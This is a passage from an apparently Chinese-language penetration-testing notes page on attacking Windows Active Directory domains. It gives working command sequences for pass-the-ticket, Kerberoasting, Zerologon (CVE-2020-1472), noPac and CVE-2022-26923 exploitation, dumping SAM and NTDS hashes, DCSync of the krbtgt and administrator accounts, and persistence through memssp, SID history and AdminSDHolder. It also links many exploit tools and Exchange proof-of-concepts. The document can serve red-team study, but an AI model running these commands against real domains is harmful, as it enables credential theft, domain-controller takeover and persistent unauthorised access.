#babed8\">kerberos::ptt administrator.kiribi</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">kerberos::tgt</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">net use k: \\pnet use k: \\pentest.comc$</span></span></code></pre></div><p>相关阅读 :</p>\n<ul>\n<li><a href=\"https://adsecurity.org/?p=1640\">https://adsecurity.org/?p=1640</a> </li>\n<li><a href=\"http://bobao.360.cn/learning/detail/3564.html\">域服务账号破解实践</a> </li>\n<li><a href=\"https://blog.csdn.net/wulantian/article/details/42418231\">Kerberos的认证原理</a> </li>\n<li><a href=\"https://klionsec.github.io/2016/08/10/ntlm-kerberos/\">深刻理解windows安全认证机制ntlm＆Kerberos</a></li>\n</ul>\n<h5 id=\"Kerberos的银票务\"><a href=\"#Kerberos的银票务\" class=\"headerlink\" title=\"Kerberos的银票务\"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别：<br>Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限<br>银票：伪造TGS，<code>只能访问指定的服务</code><br>加密方式不同：<br>Golden Ticket由<code>krbtgt</code>的hash加密<br>Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密<br>认证流程不同：<br>金票在使用的过程需要同域控通信<br>银票在使用的过程不需要同域控通信<br>相关阅读 :</p>\n<ul>\n<li><a href=\"https://adsecurity.org/?p=2011\">攻击者如何使用Kerberos的银票来利用系统</a> </li>\n<li><a href=\"https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf\">域渗透——Pass The Ticket</a></li>\n</ul>\n<h5 id=\"域服务账号破解\"><a href=\"#域服务账号破解\" class=\"headerlink\" title=\"域服务账号破解\"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理<br><a href=\"https://github.com/nidem/kerberoast\">https://github.com/nidem/kerberoast</a><br>获取所有用作SPN的帐户</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">setspn -T PENTEST.com -Q */*</span></span></code></pre></div><p>从Mimikatz的RAM中提取获得的门票</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">kerberos::list /export</span></span></code></pre></div><p>用rgsrepcrack破解</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span></span></code></pre></div><h5 id=\"凭证盗窃\"><a href=\"#凭证盗窃\" class=\"headerlink\" title=\"凭证盗窃\"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码 </p>\n<h5 id=\"NTLM-relay\"><a href=\"#NTLM-relay\" class=\"headerlink\" title=\"NTLM relay\"></a>NTLM relay</h5><ul>\n<li><a href=\"https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/\">One API call away from Domain Admin</a></li>\n<li><a href=\"https://github.com/dirkjanm/privexchange/\">privexchange</a></li>\n<li><a href=\"https://github.com/ridter/exchange2domain\">Exchange2domain</a></li>\n</ul>\n<p>用于主动让目标机器发起NTLM请求的方法：</p>\n<ul>\n<li><a href=\"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py\">printerbug</a></li>\n<li><a href=\"https://github.com/topotam/PetitPotam\">PetitPotam</a></li>\n</ul>\n<p>Relay LDAP:</p>\n<ul>\n<li><a href=\"https://github.com/Ridter/CVE-2019-1040-dcpwn\">CVE-2019-1040-dcpwn</a></li>\n</ul>\n<p>Relay AD CS&#x2F;PKI:</p>\n<ul>\n<li><a href=\"https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/\">AD CS&#x2F;PKI template exploit</a></li>\n</ul>\n<p>集成几个利用的工具：</p>\n<ul>\n<li><a href=\"https://github.com/Ridter/Relayx\">Relayx</a></li>\n</ul>\n<p>内网445端口转发：</p>\n<ul>\n<li><a href=\"https://github.com/praetorian-inc/PortBender\">PortBender</a></li>\n</ul>\n<h5 id=\"Kerberos委派\"><a href=\"#Kerberos委派\" class=\"headerlink\" title=\"Kerberos委派\"></a>Kerberos委派</h5><ul>\n<li><a href=\"https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\">Wagging-the-Dog.html</a></li>\n<li><a href=\"https://blog.harmj0y.net/activedirectory/s4u2pwnage/\">s4u2pwnage</a></li>\n<li><a href=\"https://xz.aliyun.com/t/2931\">Attacking Kerberos Delegation</a></li>\n<li><a href=\"https://adsecurity.org/?p=4056\">用打印服务获取域控</a></li>\n<li><a href=\"https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/\">Computer Takeover</a></li>\n<li><a href=\"https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/\">Combining NTLM Relaying and Kerberos delegation</a></li>\n<li><a href=\"https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/\">CVE-2019-1040</a></li>\n</ul>\n<h5 id=\"地址解析协议\"><a href=\"#地址解析协议\" class=\"headerlink\" title=\"地址解析协议\"></a>地址解析协议</h5><p>实在搞不定再搞ARP </p>\n<h5 id=\"Zerologon\"><a href=\"#Zerologon\" class=\"headerlink\" title=\"Zerologon\"></a>Zerologon</h5><p>1、利用Mimikatz<br><strong>check</strong></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">lsadump::zerologon /target:dc1.exploit.local /account:dc1$</span></span></code></pre></div><p><strong>exploit</strong></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit</span></span></code></pre></div><p><strong>dcsync</strong></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:&quot;&quot; /domain:exploit.local /authntlm /user:krbtgt</span></span></code></pre></div><p><strong>restore</strong></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">lsadump::postzerologon /target:conttosson.locl /account:dc$ </span></span></code></pre></div><p>2、利用impacket：</p>\n<ul>\n<li>取目标主机名+IP</li>\n<li>install 修改版本的impacket</li>\n<li>Exp</li>\n</ul>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python cve-2020-1472-exploit.py DC2008 10.211.55.200</span></span></code></pre></div><p><img src=\"https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190137.png\"></p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">secretsdump.py -no-pass cgdomain.com/&#39;DC2008$&#39;@10.211.55.200 -history -just-dc-user administrator</span></span></code></pre></div><div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae</span></span></code></pre></div><p><img src=\"https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190359.png\"></p>\n<p>获取到旧的密码明文hex，还原</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b</span></span></code></pre></div><p><img src=\"https://blogpics-1251691280.file.myqcloud.com/imgs/20200916190457.png\"></p>\n<p>恢复方法2<br>通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38</span></span></code></pre></div><p>然后分别执行,拷贝本机中SAM数据库到本地</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">- reg save HKLM\\SYSTEM system.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- reg save HKLM\\SAM sam.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- reg save HKLM\\SECURITY security.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- get system.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- get sam.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- get security.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- del /f system.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- del /f sam.save</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">- del /f security.save</span></span></code></pre></div><p>提取明文hash</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span></span></code></pre></div><p>然后恢复。<br>​    </p>\n<h5 id=\"noPac\"><a href=\"#noPac\" class=\"headerlink\" title=\"noPac\"></a>noPac</h5><p>漏洞分析：<a href=\"https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html\">CVE-2021-42287&#x2F;CVE-2021-42278 Weaponisation</a></p>\n<p>Exploit：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"># Create Machine Account</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">New-MachineAccount -MachineAccount TestSPN -Domain internal.zeroday.lab -DomainController idc1.internal.zeroday.lab -Verbose</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># Clear SPNs</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Set-DomainObject &quot;CN=TestSPN,CN=Computers,DC=internal,DC=zeroday,DC=lab&quot; -Clear &#39;serviceprincipalname&#39; -Verbose</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># Change Machine Account samaccountname</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Set-MachineAccountAttribute -MachineAccount TestSPN -Value &quot;IDC1&quot; -Attribute samaccountname -Verbose</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># Request TGT</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">.\\Rubeus.exe asktgt /user:IDC1 /password:Password1 /domain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /nowrap</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># Change Machine Account samaccountname</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">Set-MachineAccountAttribute -MachineAccount TestSPN -Value &quot;TestSPN&quot; -Attribute samaccountname -Verbose</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># Request S4U2self</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">.\\Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:idc1.internal.zeroday.lab /self /altservice:LDAP/IDC1.internal.zeroday.lab /ptt /ticket:[TGT]</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span></code></pre></div><p>一键利用：<a href=\"https://github.com/cube0x0/noPac\">noPac</a></p>\n<h5 id=\"ADCS\"><a href=\"#ADCS\" class=\"headerlink\" title=\"ADCS\"></a>ADCS</h5><p>利用ADCS中错误配置的模板进行域提权，详细可参考：<a href=\"https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf\">Certified_Pre-Owned</a></p>\n<p>可利用工具：</p>\n<ul>\n<li><a href=\"https://github.com/GhostPack/Certify\">Certify</a></li>\n<li><a href=\"https://github.com/ly4k/Certipy\">Certipy</a></li>\n<li><a href=\"https://github.com/dirkjanm/PKINITtools\">PKINITtools</a></li>\n<li><a href=\"https://github.com/eloypgz/certi\">certi</a></li>\n</ul>\n<h5 id=\"CVE-2022-26923\"><a href=\"#CVE-2022-26923\" class=\"headerlink\" title=\"CVE-2022-26923\"></a>CVE-2022-26923</h5><p>前提：域内有ADCS<br>Exploit:</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\"># 修改可控机器DNS</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">python certi.py account create cgdomain.com/sanfeng:&#39;1qazXSW@&#39;@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns dc2008.cgdomain.com</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># 请求证书</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">python certi.py req &#39;cgdomain.com/testvul$:NUxhMemzaP4rsPnu&#39;@10.211.55.200 -dc-ip 10.211.55.200 -ca cgdomain-DC2008-CA -template &#39;Machine&#39;</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># 获取DC hash</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">python certi.py auth -dc-ip 10.211.55.200 -pfx dc2008.pfx -username dc2008$</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span>\n<span class=\"line\"><span style=\"color: #babed8\"># 还原机器DNS</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">python certi.py account update cgdomain.com/sanfeng:&#39;1qazXSW@&#39;@10.211.55.200 -dc-ip 10.211.55.200 -user testvul -dns testvul.hqcec.com</span></span></code></pre></div><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注：此环境的ADCS与DC为同一台机器。真实环境需要根据实际情况进行参数调整。</p></blockquote>\n<h4 id=\"获取AD哈希\"><a href=\"#获取AD哈希\" class=\"headerlink\" title=\"获取AD哈希\"></a>获取AD哈希</h4><ul>\n<li>使用VSS卷影副本 </li>\n<li>Ntdsutil中获取NTDS.DIT​​文件 </li>\n<li>PowerShell中提取NTDS.DIT –&gt;<a href=\"https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy\">Invoke-NinaCopy </a></li>\n<li>使用Mimikatz提取</li>\n</ul>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">mimikatz lsadump::lsa /inject exit </span></span></code></pre></div><ul>\n<li>使用PowerShell Mimikatz</li>\n<li>使用Mimikatz的DCSync 远程转储Active Directory凭证<br>提取 KRBTGT用户帐户的密码数据：</li>\n</ul>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：krbtgt&quot;exit</span></span></code></pre></div><p>管理员用户帐户提取密码数据：</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit</span></span>\n<span class=\"line\"><span style=\"color: #babed8\"></span></span></code></pre></div><ul>\n<li>NTDS.dit中提取哈希<br>使用esedbexport恢复以后使用ntdsxtract提取</li>\n</ul>\n<h4 id=\"AD持久化\"><a href=\"#AD持久化\" class=\"headerlink\" title=\"AD持久化\"></a>AD持久化</h4><h5 id=\"活动目录持久性技巧\"><a href=\"#活动目录持久性技巧\" class=\"headerlink\" title=\"活动目录持久性技巧\"></a>活动目录持久性技巧</h5><p><a href=\"https://adsecurity.org/?p=1929\">https://adsecurity.org/?p=1929</a><br>DS恢复模式密码维护<br>DSRM密码同步 </p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a href=\"https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96](http://drops.xmd5.com/static/drops/tips-9297.html)\">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p></blockquote>\n<p><a href=\"https://www.dcshadow.com/\">DCshadow </a></p>\n<h5 id=\"Security-Support-Provider\"><a href=\"#Security-Support-Provider\" class=\"headerlink\" title=\"Security Support Provider\"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">privilege::debug</span></span>\n<span class=\"line\"><span style=\"color: #babed8\">misc::memssp</span></span></code></pre></div><p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p>\n<h5 id=\"SID-History\"><a href=\"#SID-History\" class=\"headerlink\" title=\"SID History\"></a><a href=\"https://adsecurity.org/?p=1772\">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>\n<div class=\"language-txt\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">txt</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #babed8\">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span></span></code></pre></div><h5 id=\"AdminSDHolder＆SDProp\"><a href=\"#AdminSDHolder＆SDProp\" class=\"headerlink\" title=\"AdminSDHolder＆SDProp \"></a><a href=\"https://adsecurity.org/?p=1906\">AdminSDHolder＆SDProp </a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限 </p>\n<h5 id=\"组策略\"><a href=\"#组策略\" class=\"headerlink\" title=\"组策略\"></a>组策略</h5><p><a href=\"https://adsecurity.org/?p=2716\">https://adsecurity.org/?p=2716</a><br><a href=\"https://www.anquanke.com/post/id/86531\">策略对象在持久化及横向渗透中的应用</a> </p>\n<h5 id=\"Hook-PasswordChangeNotify\"><a href=\"#Hook-PasswordChangeNotify\" class=\"headerlink\" title=\"Hook PasswordChangeNotify\"></a>Hook PasswordChangeNotify</h5><p><a href=\"http://www.vuln.cn/6812\">http://www.vuln.cn/6812</a></p>\n<h5 id=\"Kerberoasting后门\"><a href=\"#Kerberoasting后门\" class=\"headerlink\" title=\"Kerberoasting后门\"></a>Kerberoasting后门</h5><p><a href=\"https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting\">域渗透-Kerberoasting</a></p>\n<h5 id=\"AdminSDHolder\"><a href=\"#AdminSDHolder\" class=\"headerlink\" title=\"AdminSDHolder\"></a>AdminSDHolder</h5><p><a href=\"https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence\">Backdooring AdminSDHolder for Persistence</a></p>\n<h5 id=\"Delegation\"><a href=\"#Delegation\" class=\"headerlink\" title=\"Delegation\"></a>Delegation</h5><p><a href=\"https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence\">Unconstrained Domain Persistence</a></p>\n<h5 id=\"黄金证书\"><a href=\"#黄金证书\" class=\"headerlink\" title=\"黄金证书\"></a>黄金证书</h5><p><a href=\"https://blog.harmj0y.net/activedirectory/certified-pre-owned/\">certified-pre-owned</a></p>\n<p>证书伪造：<br><a href=\"https://github.com/Ridter/pyForgeCert\">pyForgeCert</a></p>\n<h4 id=\"其他-1\"><a href=\"#其他-1\" class=\"headerlink\" title=\"其他\"></a>其他</h4><h5 id=\"域内主机提权\"><a href=\"#域内主机提权\" class=\"headerlink\" title=\"域内主机提权\"></a>域内主机提权</h5><p><a href=\"https://github.com/Ridter/SharpAddDomainMachine\">SharpAddDomainMachine</a></p>\n<h5 id=\"Exchange的利用\"><a href=\"#Exchange的利用\" class=\"headerlink\" title=\"Exchange的利用\"></a>Exchange的利用</h5><ul>\n<li><a href=\"https://github.com/ridter/owa_info\"><strong>owa_info</strong></a></li>\n<li><a href=\"https://github.com/Ridter/Exchange2domain\"><strong>Exchange2domain</strong></a></li>\n<li><a href=\"https://github.com/WyAtu/CVE-2018-8581/\"><strong>CVE-2018-8581</strong></a></li>\n<li><a href=\"https://github.com/Ridter/CVE-2019-1040\"><strong>CVE-2019-1040</strong></a> </li>\n<li><a href=\"https://github.com/Ridter/CVE-2020-0688\"><strong>CVE-2020-0688</strong></a></li>\n<li><a href=\"https://github.com/Arno0x/NtlmRelayToEWS\"><strong>NtlmRelayToEWS</strong></a></li>\n<li><a href=\"https://github.com/3gstudent/ewsManage\"><strong>ewsManage</strong></a></li>\n<li><a href=\"https://github.com/h4x0r-dz/CVE-2021-26855\"><strong>CVE-2021-26855</strong></a></li>\n<li><a href=\"https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda\"><strong>CVE-2021-28482</strong></a></li>\n<li><a href=\"https://github.com/hosch3n/ProxyVulns\"><strong>ProxyVulns</strong></a></li>\n<li><a href=\"https://github.com/testanull/ProxyNotShell-PoC\"><strong>ProxyNotShell</strong></a></li>\n<li><a href=\"https://github.com/balki97/OWASSRF-CVE-2022-41082-POC\"><strong>OWASSRF-ProxyNotShell</strong></a></li>\n<li><a href=\"https://gist.github.com/testanull/518871a2e2057caa2bc9c6ae6634103e\"><strong>Tabshell</strong></a></li>\n</ul>\n<h4 